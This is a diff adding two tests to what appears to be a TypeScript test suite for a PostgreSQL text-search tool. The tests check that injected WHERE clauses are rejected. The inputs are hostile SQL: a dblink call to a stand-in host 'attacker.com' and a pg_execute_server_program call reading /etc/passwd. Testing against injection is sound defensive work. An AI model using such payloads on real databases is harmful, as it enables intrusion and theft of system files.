@@ -377,6 +377,37 @@ describe("WHERE Clause Remote Access & Side Channel Injection", () => {
     expect(result.success).toBe(false);
     expect(result.error).toContain("Unsafe WHERE clause");
   });
+
+  it("should reject WHERE clause with dblink()", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where:
+          "id IN (SELECT * FROM dblink('host=attacker.com','SELECT 1') AS t(x int))",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with pg_execute_server_program", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "pg_execute_server_program('/bin/cat /etc/passwd')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
 });
 
 // =============================================================================
